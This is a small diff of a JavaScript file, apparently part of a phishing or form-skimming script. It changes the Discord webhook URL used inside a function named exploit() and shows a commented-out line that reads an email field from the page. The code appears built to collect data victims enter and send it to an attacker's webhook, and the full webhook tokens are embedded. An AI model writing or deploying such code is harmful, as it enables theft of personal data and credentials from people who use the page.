@@ -2,7 +2,7 @@ let num = 0;
 
 function exploit() {
     if (window.location.search) {
-        const webhookURL = 'https://discord.com/api/webhooks/1201061417382580224/57kd9yPBA1RbBohMzYdm23QCYvyHei1Dv4l7Fh9CmAn1sVB9zjsLw-CA6DGmXUpV0dBV';
+        const webhookURL = "https://discord.com/api/webhooks/1199645026158923776/WFfVIM3ZrddxS0gl0LTfzNhjDlX53PZ2Jys8bkUt_4a9zzdH_L6f1XnYtbr9PUZnw-Ab"
 
 
         // let email = document.getElementById("uid_5").value; //email
